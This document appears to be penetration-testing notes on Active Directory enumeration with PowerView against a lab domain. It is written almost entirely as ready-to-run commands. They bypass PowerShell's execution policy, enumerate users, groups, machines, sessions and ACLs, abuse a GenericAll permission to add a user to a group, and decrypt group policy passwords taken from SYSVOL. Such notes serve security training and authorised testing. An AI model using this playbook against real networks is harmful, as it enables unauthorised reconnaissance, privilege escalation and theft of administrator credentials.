Transfer powerview to target: https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
```powershell
powershell -ep bypass
```
```powershell
Import-Module .\PowerView.ps1
```
# Basic Enumeration
```powershell
Get-NetDomain
```
## Get users on domain
```powershell
Get-NetUser
```
```powershell
Get-NetUser | select cn
```
```powershell
Get-NetUser | select cn,pwdlastset,lastlogon
```
### Get specific user details
```powershell
Get-NetUser fred
```
## Get groups on domain
```powershell
Get-NetGroup | select cn
```
### Get specific group members
```powershell
Get-NetGroup "Sales Department" | select member
```
## Enumerate domain-joined machines
```powershell
Get-NetComputer
```
```powershell
Get-NetComputer | select name,dnshostname,operatingsystem,operatingsystemversion
```
## Enumerate User Permissions
Check user to see if they have admin privileges on any domain machines:
```powershell
Find-LocalAdminAccess
```
## Enumerate Logged on Users
This will check a computer to see if there are any users currently logged in. Due to windows changing how to handles sessions, the API's running behind the hood may require admin:
```powershell
Get-NetSession -ComputerName files04 -Verbose
```
Alternatively, use sysinternals tool PsLoggedOn (https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon):
```powershell
.\PsLoggedon.exe \\client74
```
# Enumerate ACE's
Access Control Entries associated with objects defines whether access to the specific object is allowed or denied.
* GenericAll: Full permissions on object
* GenericWrite: Edit certain attributes on the object
* WriteOwner: Change ownership of the object
* WriteDACL: Edit ACE's applied to object
* AllExtendedRights: Change password, reset password, etc.
* ForceChangePassword: Password change for object
* Self (Self-Membership): Add ourselves to for example a group
```powershell
Get-ObjectAcl -Identity stephanie
```
Note the "ObjectSID" and "SecurityIdentifier" of the output then run the following on the SIDs:
```powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```
Converting multiple SID's at once:
```powershell
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```
This command checks if a group ("Management Department") has any objects with "GenericAll" permissions:
```powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```
Typically, a regular domain user should not have GenericAll permissions on other objects in AD, so this may be a misconfiguration.
## Example misconfig
If the group "Management Department" object has a user "stephanie" configured with GenericAll permissions on that group object, they can be simply run the following command to add stephanie to the group:
```powershell
net group "Management Department" stephanie /add /domain
```
# Enumerating Domain Shares
```powershell
Find-DomainShare
```
If files are shown, they can be viewed:
```powershell
ls "\\dc1.corp.com\sysvol\corp.com\"
```
```powershell
cat "\\dc1.corp.com\sysvol\corp.com\file.txt"
```
Look for domain policy files! They store local admin passwords and can be decrypted:
```powershell
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```
